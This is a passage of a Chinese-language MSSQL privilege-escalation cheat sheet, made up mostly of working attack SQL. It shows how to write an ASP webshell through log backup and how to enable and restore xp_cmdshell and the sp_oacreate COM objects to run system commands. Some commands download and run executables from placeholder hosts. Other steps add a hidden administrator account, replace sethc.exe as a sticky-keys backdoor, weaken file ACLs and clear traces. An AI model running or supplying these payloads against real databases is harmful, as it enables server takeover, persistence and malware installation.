<span class="hljs-keyword">alter</span> database 库名 <span class="hljs-keyword">set</span> RECOVERY <span class="hljs-keyword">FULL</span>
<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> cmd (a image)
backup log 库名 <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">'c:\www'</span> <span class="hljs-keyword">with</span> init
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> cmd (a) <span class="hljs-keyword">values</span> (<span class="hljs-number">0x3C25657865637574652872657175657374282261222929253E</span>)
backup log 库名 <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">'c:\www\2.asp'</span></code></pre>
<h2 id="sp_addextendedproc">sp_addextendedproc</h2>
<p>sp_addextendedproc 可以利用于恢复组件</p>
<pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_cmdshell ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xplog70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_enumgroups ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xplog70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_loginconfig ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xplog70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_enumerrorlogs ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_getfiledetails ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OACreate ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'odsole70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OADestroy ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'odsole70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAGetErrorInfo ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'odsole70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAGetProperty ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'odsole70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAMethod ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'odsole70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OASetProperty ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'odsole70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAStop ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'odsole70.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regaddmultistring ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regdeletekey ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regdeletevalue ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regenumvalues ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regremovemultistring ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regwrite ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_dirtree ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regread ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span>
<span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_fixeddrives ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">'xpstar.dll'</span></code></pre>
<h2 id="xp_cmdshell提权">xp_cmdshell提权</h2>
<p>xp_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令。</p>
<h3 id="利用条件">利用条件</h3>
<ul>
<li>拥有 DBA 权限, 在 2005 中 xp_cmdshell 的权限是 system，2008 中是 network。</li>
<li>依赖 xplog70.dll</li>
</ul>
<h3 id="利用过程">利用过程</h3>
<pre><code class="hljs sql"><span class="hljs-comment">-- 判断当前是否为DBA权限，为1则可以提权</span>
<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>);

<span class="hljs-comment">-- 查看是否存在 xp_cmdshell</span>
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-number">1</span>;RECONFIGURE;

<span class="hljs-comment">-- 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭</span>
<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype <span class="hljs-operator">=</span> <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'xp_cmdshell'</span>

<span class="hljs-comment">-- 关闭 xp_cmdshell</span>
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-number">0</span>;RECONFIGURE;

<span class="hljs-comment">-- 开启 xp_cmdshell</span>
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'xp_cmdshell'</span>, <span class="hljs-number">1</span>;RECONFIGURE;

<span class="hljs-comment">-- 执行 xp_cmdshell</span>
<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">'cmd /c whoami'</span>

<span class="hljs-comment">-- xp_cmdshell 调用cmd.exe用powershell 远程下载exe并执行</span>
<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">'"echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile("http://example/test0.exe","%TEMP%\test.exe") &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create "%TEMP%\test.exe""'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806211620.png" alt></p>
<p><strong>无会显,也无法进行 dnslog 怎么办</strong></p>
<p>通过临时表查看命令执行的结果</p>
<pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> tmpTable (tmp1 <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>));
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> tmpTable(tmp1) <span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">'ipconfig'</span>
<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> tmpTable</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806211657.png" alt></p>
<h3 id="常见报错">常见报错</h3>
<ul>
<li>标记message: 配置选项 ‘xp_cmdshell’ 不存在，也可能是高级选<br>
<code>sql EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'user connections',1;RECONFIGURE;</code></li>
</ul>
<h3 id="痕迹清理">痕迹清理</h3>
<p>删除扩展存储过过程 xp_cmdshell</p>
<pre><code class="hljs sql"><span class="hljs-keyword">exec</span> sp_dropextendedproc <span class="hljs-string">'xp_cmdshell'</span></code></pre>
<p><strong>如果 xp_cmdshell 被删除了怎么办</strong></p>
<p>如果 xp_cmdshell 被删除了，需要重新恢复或自己上传 xplog70.dll 进行恢复</p>
<p>以mssql2012为例，默认路径为</p>
<pre><code class="hljs scss">C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\xplog70.dll</code></pre>
<pre><code class="hljs sql"><span class="hljs-comment">-- 判断存储扩展是否存在,返回结果为1就OK</span>
<span class="hljs-keyword">Select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">'X'</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">'xp_cmdshell'</span>

<span class="hljs-comment">-- 恢复xp_cmdshell,返回结果为1就OK</span>
<span class="hljs-keyword">Exec</span> sp_addextendedproc <span class="hljs-string">'xp_cmdshell'</span>,<span class="hljs-string">'xplog70.dll'</span>;
<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">'X'</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">'xp_cmdshell'</span>

<span class="hljs-comment">-- 否则上传xplog70.dll</span>
<span class="hljs-keyword">Exec</span> master.dbo.sp_addextendedproc <span class="hljs-string">'xp_cmdshell'</span>,<span class="hljs-string">'D:\\xplog70.dll'</span></code></pre>
<p><strong>bypass</strong></p>
<pre><code class="hljs sql"><span class="hljs-string">'; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping xxx.burpcollaborator.net’ —</span></code></pre>
<h2 id="sp_oacreate提权">sp_oacreate提权</h2>
<p>sp_oacreate 是一个非常危险的存储过程可以删除、复制、移动文件。还能配合 sp_oamethod 来写文件执行 cmd。</p>
<h3 id="利用条件">利用条件</h3>
<ul>
<li>拥有DBA权限</li>
<li>依赖 odsole70.dll</li>
</ul>
<h3 id="提权过程">提权过程</h3>
<pre><code class="hljs sql"><span class="hljs-comment">-- 判断当前是否为DBA权限，为1则可以提权</span>
<span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>);

<span class="hljs-comment">-- 判断SP_OACREATE状态,如果存在返回1</span>
<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">'SP_OACREATE'</span>

<span class="hljs-comment">-- 启用 sp_oacreate</span>
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>;  
RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;  
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'Ole Automation Procedures'</span>, <span class="hljs-number">1</span>;  
RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;  
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">0</span>;
</code></pre>
<p><strong>wscript.shell 组件执行命令</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@exec</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@text</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@str</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'wscript.shell'</span>,<span class="hljs-variable">@ffffffff0x</span> output
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'exec'</span>,<span class="hljs-variable">@exec</span> output,<span class="hljs-string">'C:\\Windows\\System32\\cmd.exe /c whoami'</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@exec</span>, <span class="hljs-string">'StdOut'</span>, <span class="hljs-variable">@text</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@text</span>, <span class="hljs-string">'readall'</span>, <span class="hljs-variable">@str</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">select</span> <span class="hljs-variable">@str</span>;</code></pre>
<pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'wscript.shell'</span>,<span class="hljs-variable">@ffffffff0x</span> output
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'run'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'c:\windows\system32\cmd.exe /c whoami &gt;c:\\www\\1.txt'</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212140.png" alt></p>
<p><strong>利用 com 组件执行命令</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@exec</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@text</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@str</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'{72C24DD5-D70A-438B-8A42-98424B88AFB8}'</span>,<span class="hljs-variable">@ffffffff0x</span> output
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'exec'</span>,<span class="hljs-variable">@exec</span> output,<span class="hljs-string">'C:\\Windows\\System32\\cmd.exe /c whoami'</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@exec</span>, <span class="hljs-string">'StdOut'</span>, <span class="hljs-variable">@text</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@text</span>, <span class="hljs-string">'readall'</span>, <span class="hljs-variable">@str</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">select</span> <span class="hljs-variable">@str</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212207.png" alt></p>
<p><strong>利用 com 组件写文件</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@ObjectToken</span> <span class="hljs-type">INT</span>;
<span class="hljs-keyword">EXEC</span> Sp_OACreate <span class="hljs-string">'{00000566-0000-0010-8000-00AA006D2EA4}'</span>,<span class="hljs-variable">@ObjectToken</span> OUTPUT;
<span class="hljs-keyword">EXEC</span> Sp_OASetProperty <span class="hljs-variable">@ObjectToken</span>, <span class="hljs-string">'Type'</span>, <span class="hljs-number">1</span>;
<span class="hljs-keyword">EXEC</span> sp_oamethod <span class="hljs-variable">@ObjectToken</span>, <span class="hljs-string">'Open'</span>;
<span class="hljs-keyword">EXEC</span> sp_oamethod <span class="hljs-variable">@ObjectToken</span>, <span class="hljs-string">'Write'</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-number">0x66666666666666663078</span>;
<span class="hljs-keyword">EXEC</span> sp_oamethod <span class="hljs-variable">@ObjectToken</span>, <span class="hljs-string">'SaveToFile'</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">'ffffffff0x.txt'</span>,<span class="hljs-number">2</span>;
<span class="hljs-keyword">EXEC</span> sp_oamethod <span class="hljs-variable">@ObjectToken</span>, <span class="hljs-string">'Close'</span>;
<span class="hljs-keyword">EXEC</span> sp_OADestroy <span class="hljs-variable">@ObjectToken</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212227.png" alt></p>
<p><strong>filesystemobject COM 对象利用</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object">https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object</a></li>
</ul>
<p>filesystemobject”COM 对象允许我们复制文件、管理驱动器等等。</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 利用 filesystemobject 写vbs脚本</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@a</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>,<span class="hljs-string">'createtextfile'</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">'c:\\www\\ffffffff0x.vbs'</span>, <span class="hljs-number">1</span>
<span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">'writeline'</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-string">'hahahahahahhahahah'</span>

<span class="hljs-comment">-- 配合 wscript.shell 组件执行</span>
<span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@s</span> <span class="hljs-type">int</span> <span class="hljs-keyword">EXEC</span> sp_oacreate [wscript.shell], <span class="hljs-variable">@s</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">EXEC</span> sp_oamethod <span class="hljs-variable">@s</span>,[run],<span class="hljs-keyword">NULL</span>,[c:\\www\\ffffffff0x.vbs]</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212309.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212321.png" alt></p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 复制具有不同名称和位置的 calc.exe 可执行文件</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>;
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>, <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-keyword">out</span>;
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'copyfile'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'c:\\windows\\system32\calc.exe'</span>,<span class="hljs-string">'c:\\windows\\system32\calc_copy.exe'</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806212336.png" alt></p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 移动文件</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>,<span class="hljs-variable">@ffffffff0x</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'movefile'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'c:\\www\\1.txt'</span>,<span class="hljs-string">'c:\\www\\3.txt'</span></code></pre>
<pre><code class="hljs sql"><span class="hljs-comment">-- 删除文件</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@result</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>, <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'deletefile'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'c:\\www\\1.txt'</span>
<span class="hljs-keyword">exec</span> sp_oadestroy <span class="hljs-variable">@ffffffff0x</span></code></pre>
<pre><code class="hljs sql"><span class="hljs-comment">-- 替换粘滞键</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>;
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>, <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-keyword">out</span>;
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'copyfile'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'c:\\windows\\system32\calc.exe'</span>,<span class="hljs-string">'c:\\windows\\system32\sethc.exe'</span>;

<span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>;
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'scripting.filesystemobject'</span>, <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-keyword">out</span>;
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">'copyfile'</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">'c:\windows\system32\sethc.exe'</span>,<span class="hljs-string">'c:\windows\system32\dllcache\sethc.exe'</span></code></pre>
<p><strong>ScriptControl COM 对象利用(未测试成功)</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://developpaper.com/introduction-of-msscriptcontrol-scriptcontrol-component-properties-methods-and-events/">https://developpaper.com/introduction-of-msscriptcontrol-scriptcontrol-component-properties-methods-and-events/</a></li>
</ul>
<p>ScriptControl 允许我们在 SQL Server 中实际运行脚本语言，例如 VBScript 或 JavaScript。</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 使用 JavaScript 创建帐户、更改其密码并将新帐户添加到管理员组</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">EXEC</span> sp_OACreate <span class="hljs-string">'ScriptControl'</span>,<span class="hljs-variable">@ffffffff0x</span> <span class="hljs-keyword">OUT</span>;
<span class="hljs-keyword">EXEC</span> sp_OASetProperty <span class="hljs-variable">@ffffffff0x</span>, <span class="hljs-string">'Language'</span>, <span class="hljs-string">'JavaScript'</span>;
<span class="hljs-keyword">EXEC</span> sp_OAMethod <span class="hljs-variable">@ffffffff0x</span>, <span class="hljs-string">'Eval'</span>, <span class="hljs-keyword">NULL</span>,
    <span class="hljs-string">'var o=new ActiveXObject("Shell.Users");</span>
<span class="hljs-string">    z=o.create("testuser");</span>
<span class="hljs-string">    z.changePassword("123456!@#","")</span>
<span class="hljs-string">    z.setting("AccountType")=3;'</span>;

<span class="hljs-comment">-- 0:"Guests"</span>
<span class="hljs-comment">-- 1:"Users"</span>
<span class="hljs-comment">-- 2:"Power Users"</span>
<span class="hljs-comment">-- 3:"Administrators"</span>

<span class="hljs-comment">-- 下载恶意软件</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">EXEC</span> sp_OAcreate <span class="hljs-string">'Scriptcontrol'</span>,<span class="hljs-variable">@ffffffff0x</span> <span class="hljs-keyword">OUT</span>;
<span class="hljs-keyword">EXEC</span> sp_OASetProperty <span class="hljs-variable">@ffffffff0x</span>, <span class="hljs-string">'Language'</span>, <span class="hljs-string">'JavaScript'</span>;
<span class="hljs-keyword">EXEC</span> sp_OAMethod <span class="hljs-variable">@ffffffff0x</span>, <span class="hljs-string">'Eval'</span>, <span class="hljs-keyword">NULL</span>,
    <span class="hljs-string">'var x = new ActiveXObject("Microsoft.XMLHTTP");</span>
<span class="hljs-string">    x.Open("GET","http://x.x.x.x:443/test.exe",0);</span>
<span class="hljs-string">    x.Send();</span>
<span class="hljs-string">    var s = new ActiveXObject("ADODB.Stream");</span>
<span class="hljs-string">    s.Mode = 3;</span>
<span class="hljs-string">    s.Type = 1;</span>
<span class="hljs-string">    s.Open();</span>
<span class="hljs-string">    S.Write(x.responseBody);</span>
<span class="hljs-string">    s.SaveToFile("C:\\www\\test.exe",2);</span>
<span class="hljs-string">    var r = new ActiveXObject("WScript.Shell");</span>
<span class="hljs-string">    r.Run("C:\\www\\test.exe");'</span>;</code></pre>
<p><strong>WMI COM 对象利用</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@objWmi</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@objLocator</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@objPermiss</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@objRet</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@objFull</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)
<span class="hljs-keyword">EXEC</span> sp_OACreate <span class="hljs-string">'WbemScripting.SWbemLocator.1'</span>,<span class="hljs-variable">@objLocator</span> OUTPUT;
<span class="hljs-keyword">EXEC</span> sp_OAMethod <span class="hljs-variable">@objLocator</span>,<span class="hljs-string">'ConnectServer'</span>,<span class="hljs-variable">@objWmi</span> OUTPUT,<span class="hljs-string">'.'</span>,<span class="hljs-string">'root\cimv2'</span>;
<span class="hljs-keyword">EXEC</span> sp_OAMethod <span class="hljs-variable">@objWmi</span>,<span class="hljs-string">'Get'</span>,<span class="hljs-variable">@objPermiss</span> OUTPUT,<span class="hljs-string">'Win32_LogicalFileSecuritySetting.Path=''wscript.exe'''</span>;
<span class="hljs-keyword">EXEC</span> sp_OAMethod <span class="hljs-variable">@objWmi</span>,<span class="hljs-string">'Get'</span>,<span class="hljs-variable">@objFull</span> OUTPUT, <span class="hljs-string">'Win32_SecurityDescriptor'</span>;
<span class="hljs-keyword">EXEC</span> sp_OASetProperty <span class="hljs-variable">@objFull</span>,<span class="hljs-string">'ControlFlags'</span>,<span class="hljs-number">4</span>;
<span class="hljs-keyword">EXEC</span> sp_OAMethod <span class="hljs-variable">@objPermiss</span>,<span class="hljs-string">'SetSecurityDescriptor'</span>,<span class="hljs-variable">@objRet</span> output,<span class="hljs-variable">@objFull</span>;</code></pre>
<p><strong>Shell.Application</strong></p>
<pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>
<span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">'Shell.Application'</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span>
<span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>, <span class="hljs-string">'ShellExecute'</span>,<span class="hljs-keyword">null</span>, <span class="hljs-string">'cmd.exe'</span>,<span class="hljs-string">'cmd /c net user &gt;c:\test.txt'</span>,<span class="hljs-string">'c:\windows\system32'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'1'</span>;</code></pre>
<p><strong>写入启动项</strong></p>
